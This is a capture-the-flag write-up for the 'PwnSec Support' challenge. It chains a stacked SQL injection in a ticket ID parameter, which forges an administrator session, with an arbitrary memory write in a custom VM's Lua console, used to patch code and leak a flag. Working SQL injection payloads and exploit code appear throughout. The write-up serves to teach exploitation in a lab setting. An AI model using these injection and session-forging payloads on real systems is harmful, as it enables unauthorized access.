# PwnSec Support

**Category:** Pwn | **Difficulty:** Hard | **Points:** 151 | **Flag:** `pwnsec{fa6fa484ff74c09a}`

## Challenge Description

> The support portal runs on a random instruction set some random intern made 16 years ago; please hold while your ticket is lost through 128 MB of questionable architecture.
>
> — @l3afai

## TL;DR

This challenge looked like a normal support-ticket website, but the whole site was actually running inside a custom 32-bit virtual machine called **L3afVM**.

The exploit was a chain of three issues:

1. The ticket ID was pasted directly into an SQL query, so I used a **stacked SQL injection** to create an administrator session.
2. The administrator page was a Lua console. One of its global functions, `note_save(address, value)`, gave us an **arbitrary 32-bit write** inside the VM.
3. I used that write to modify the VM instructions for `ticks()`. Instead of returning the current tick count as an integer, the patched function returned memory near the hidden `FLAG` object as a string.

Remote flag:

```text
pwnsec{fa6fa484ff74c09a}
```

The final automated exploit is in [`solve.py`](./solve.py).

---

## Files we were given

The handout contained:

```text
Dockerfile
README.md
compose.yml
ctf_sql.l3af
docker-entrypoint.sh
l3afvm
nginx.conf
```

`l3afvm` is the native program implementing the virtual machine. `ctf_sql.l3af` is the guest program it runs.

The README suggested starting it with:

```bash
./l3afvm ./ctf_sql.l3af
```

The guest normally listens on port 8080. That port was already occupied in my local environment, so I changed the embedded local test copy to use 8081. This was only a testing workaround and was not part of the actual vulnerability.

---

## First look at the guest image

Despite its size, `ctf_sql.l3af` was not a mysterious binary blob:

```bash
file ctf_sql.l3af
```

```text
ctf_sql.l3af: New Line Delimited JSON text data
```

The beginning of the file looked like this:

```json
["DATA", ".L..5704", 18]
["DATA_BYTES", ".L..5704", "756e6b6e6f776e204c7561206572726f7200"]
```

The hex decodes to strings such as `unknown Lua error`. Farther down, there were large objects named `embedded_lua_module_0`, `embedded_lua_module_1`, and so on. These contained the application's Lua source code encoded as hex.

A small Python script was enough to extract them:

```python
import json

for line in open("ctf_sql.l3af"):
    if not line.strip():
        continue
    obj = json.loads(line)
    if (
        isinstance(obj, list)
        and obj
        and obj[0] == "DATA_BYTES"
        and obj[1].startswith("embedded_lua")
    ):
        data = bytes.fromhex(obj[2]).rstrip(b"\0")
        open(obj[1] + ".lua", "wb").write(data)
```

This recovered the HTTP server, SQL engine, storage system, and web application source. The useful modules were:

```text
http/http.lua
sql/engine.lua
sql/init.lua
sql/parser.lua
sql/storage.lua
sql/types.lua
tcp/server.lua
tcp/tcp.lua
web/app.lua
web/style.lua
```

So, rather than blindly fuzzing the website, I could read exactly what it was doing.

---

## Bug 1: stacked SQL injection

The `/ticket` handler read the `id` query parameter and appended it directly to an SQL statement:

```lua
local id = request.query["id"] or ""

local results, err = run_query(
    "SELECT t.id, t.title, t.description, t.status, t.priority, "
        .. "t.created_at, t.resolution, u.username "
        .. "FROM tickets t, users u "
        .. "WHERE t.reporter_id = u.id AND t.id = " .. id)
```

In ordinary words, the server builds a query that ends like this:

```sql
AND t.id = <whatever the visitor supplied>
```

There are no quotes, type checks, or parameterized queries around `id`.

The custom SQL parser also supports several statements separated by semicolons. That means this is not limited to changing the `WHERE` condition: we can finish the original query and run an `INSERT` afterward.

The database setup showed that user ID 1 was the administrator:

```lua
db:insert("users", {
    id = 1,
    username = "root",
    password = root_password,
    is_admin = 1,
})
```

Sessions were stored in a separate table:

```lua
db:create_table("sessions", {
    {name = "token", type = "TEXT", primary_key = true, not_null = true},
    {name = "user_id", type = "INTEGER"},
    {name = "expires_at", type = "TEXT"},
    {name = "ip_address", type = "TEXT"},
})
```

Therefore, I did not need to guess the randomly generated root password. I could simply create a session belonging to root:

```sql
1;
INSERT INTO sessions (token, user_id, expires_at, ip_address)
VALUES ('pwn_example', 1, '2099-01-01', '127.0.0.1')
```

Sent through the vulnerable endpoint, that becomes:

```python
sqli = (
    "1; INSERT INTO sessions (token, user_id, expires_at, ip_address) "
    "VALUES ('pwn_example', 1, '2099-01-01', '127.0.0.1')"
)

requests.get(target + "/ticket", params={"id": sqli})
```

The normal ticket query still runs first, then our `INSERT` creates the forged session.

---

## Reaching the administrator console

The `/admin` handler checks a supplied token using this query:

```lua
SELECT u.id, u.username
FROM sessions s, users u
WHERE s.token = '<token>'
  AND s.user_id = u.id
  AND u.is_admin = 1
```

Our new session has `user_id = 1`, and root has `is_admin = 1`, so `/admin` accepts the token.

The page then runs arbitrary Lua code:

```lua
local f, load_err = load(code)
if f then
    local ok, result = pcall(f)
end
```

At this point, we have Lua code execution, but this is still code execution *inside the guest VM*. It does not immediately mean native shell access on the host.

Listing the Lua globals showed several custom functions:

```lua
for key, value in pairs(_G) do
    print(key, type(value))
end
```

Relevant output included:

```text
ticks       function
rand_hex    function
rng         function
note_save   function
tcp_send    function
tcp_recv    function
```

`note_save` was the important one.

---

## Bug 2: `note_save` is an arbitrary memory write

The guest image contains readable VM assembly. The implementation of `embedded_note_save` roughly does the following:

```text
address = luaL_checkinteger(L, 1)
value   = luaL_checkinteger(L, 2)

if address > 134217728:
    error("note address out of range")

memory[address] = value
```

Its final write instruction is:

```text
SW  address, value
```

`SW` means “store a 32-bit word.” Therefore:

```lua
note_save(address, value)
```

lets an administrator write any chosen 32-bit value to almost any address in the VM's 128 MiB guest memory.

The function name makes it sound harmless, but it is effectively a memory editor.

---

## Understanding enough of L3afVM

We do not need to reverse every VM opcode. We only need a few layout rules and the instructions used by one small function.

The VM loads data starting at `0x10000`. Every `DATA` object is aligned to four bytes. After all data is placed, the beginning of the code segment is aligned to 16 bytes.

Each VM instruction occupies 16 bytes and consists of four little-endian 32-bit words:

```text
+0x00  opcode
+0x04  operand A
+0x08  operand B
+0x0c  operand C
```

The loader also adds two instructions before the program from the file:

```text
CALL :main
HLT
```

The supplied image lets us calculate the address of every local symbol by walking its `DATA`, label, and instruction records.

The local addresses relevant to the exploit were:

```text
code start             0x3f9d10
embedded_ticks         0x3ffc70
CALL :ticks            0x3ffca0
CALL :lua_pushinteger  0x3ffd00
lua_pushstring         0x679fa0
```

---

## Turning `ticks()` into a memory reader

The original `embedded_ticks` function is approximately:

```text
CALL ticks
PUSH result
PUSH lua_state
CALL lua_pushinteger
return 1 Lua value
```

In other words, it obtains a tick count and returns it to Lua as an integer.

I changed two parts:

1. Replace `CALL ticks` with `LC R0, address`. `LC` means “load a constant,” and its opcode is 1.
2. Change the later call target from `lua_pushinteger` to `lua_pushstring`.

After the patch, the function behaves like:

```text
R0 = chosen_address
return lua_pushstring(L, R0)
```

That makes `ticks()` treat memory at our chosen address as a NUL-terminated string and return it to the Lua console.

The writes needed to patch it are conceptually:

```lua
-- Change CALL :ticks into LC R0, chosen_address.
note_save(call_ticks + 0, 1)                -- opcode = LC
note_save(call_ticks + 4, 0)                -- operand A = R0
note_save(call_ticks + 8, chosen_address)   -- operand B = constant

-- Redirect lua_pushinteger to lua_pushstring.
note_save(call_pushinteger + 4, lua_pushstring)
```

Only one problem remained: remote addresses were different from the addresses in the local handout.

---

## Finding the remote code slide

The image contains a large object named `FLAGPAD` immediately before `FLAG`. Its size differs between builds, shifting the flag and all code that follows it.

Fortunately, Lua leaks the address of embedded C functions when converting them to strings:

```lua
print(tostring(ticks))
```

Local output looked like:

```text
function: 3ffc70
```

The remote server returned:

```text
function: 420e10
```

The difference is the remote code slide:

```text
0x420e10 - 0x3ffc70 = 0x211a0
```

Adding this slide to every local code address gives its remote equivalent. For example:

```text
remote code start = 0x3f9d10 + 0x211a0
                  = 0x41aeb0
```

This is more reliable than hard-coding addresses from one build.

---

## Locating the flag

The `FLAG` object is the final data object, immediately before the aligned code segment. Its exact start can move slightly because the real flag has a different size and because of alignment padding.

Instead of guessing one exact address, I scanned the 512 bytes immediately before the remote code segment. For each candidate address, I updated the constant used by our patched `ticks()` and checked whether the returned string contained `pwnsec{`:

```lua
for address = code_start - 1, code_start - 512, -1 do
    note_save(call_ticks + 8, address)
    local candidate = ticks()

    if string.find(string.lower(candidate), "pwnsec{", 1, true) then
        print(string.format("0x%x", address))
        print(candidate)
        break
    end
end
```

On the remote instance, the flag was found at:

```text
0x41ae94
```

That is only `0x1c` bytes before the code segment at `0x41aeb0`.

---

## Final exploit flow

The automated solver performs these steps:

1. Parse the supplied `.l3af` file and calculate local data and code symbols.
2. Generate a random session token.
3. Use stacked SQL injection in `/ticket?id=` to insert a root session.
4. Use that token to access `/admin`.
5. Run `print(tostring(ticks))` to disclose the remote `embedded_ticks` address.
6. Calculate the remote code slide.
7. Use `note_save` to patch `embedded_ticks` into a string-reading function.
8. Scan backward from the remote code segment until the returned string contains `pwnsec{`.
9. Extract and print the flag from the HTML response.

Run it with:

```bash
./solve.py https://CHALLENGE_HOST
```

Output:

```text
[+] pwnsec{fa6fa484ff74c09a}
```

---

## Why this challenge was fun

The SQL injection was only the front door. Getting administrator access did not directly reveal the flag; it exposed a deliberately dangerous VM helper. From there, the challenge became a small virtual-machine pwn task.

The nicest part was that a very small amount of VM knowledge was enough. There was no need to understand the entire Lua interpreter or every L3afVM instruction. The solution only needed:

- the guest memory layout;
- the 16-byte instruction format;
- an arbitrary 32-bit write;
- a function-pointer leak; and
- a useful function that could be patched into a reader.

Chaining those pieces turned a harmless-looking `ticks()` function into a way to read the hidden flag.
